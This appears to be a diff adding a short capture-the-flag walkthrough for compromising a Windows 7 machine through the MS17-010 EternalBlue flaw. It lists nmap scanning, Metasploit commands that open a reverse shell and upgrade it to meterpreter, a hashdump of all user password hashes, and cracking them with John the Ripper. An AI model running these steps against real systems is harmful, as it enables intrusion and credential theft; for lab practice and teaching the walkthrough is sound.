@@ -1,0 +1,55 @@
+(Only for ctf purposes)
+
+Gain access to Windows 7 machine  through MS17-010 Eternal Blue vulnerability
+	-----------------------------	----------------------------
+	
+Pre-tasks:
+ (Make sure you have the following programs installed: NMap, John the Ripper, Metasploit)
+ (Download a wordlist ie. rockyou) (Kali normally have wordlists built in.  $ locate rockyou )
+
+
+
+
+---------------------------------------------------------------------------------------------
+
+1) Scan the vulnerable PC:
+   $ nmap [ip of target] --script=vuln
+   (Is port 445 open?)
+   (What vulnerabilities has been detected for that port?)
+
+2) Start Metasploit framework
+
+   $ msfconsole
+   
+   msf6> use exploit/windows/smb/ms17_010_eternalblue
+   msf6(exploit/windows/smb/ms17_010_eternalblue) > set RHOSTS [ip of target]
+   msf6(exploit/windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
+   
+   (This should give you a windows shell) Press ctrl+z to background the session
+   
+   msf6(exploit/windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter
+   msf6(post/multi/manage/shell_to_meterpreter) > sessions
+   (Find sessions id)
+   msf6(post/multi/manage/shell_to_meterpreter) > set SESSION [session id]
+   
+   Use this session that you created
+   msf6(post/multi/manage/shell_to_meterpreter) > sessions
+   (Find the new sessions id)
+   msf6(post/multi/manage/shell_to_meterpreter) > sessions [new id]
+   
+   meterpreter > hashdump        
+   (This will show all the password hashes for users. Copy and paste this in a file called passwd.txt)
+   
+   
+3) In a new terminal start JohntheRipper
+   
+   $ john passwd.txt -wordlist=[path to your wordlist] --format=NT
+   (Should output the cracked password to terminal) (If you want to see it again find the john.pot file)
+   ( $ sudo updatedb
+     $ locate john.pot )
+
+   
+   
+   
+   
+   
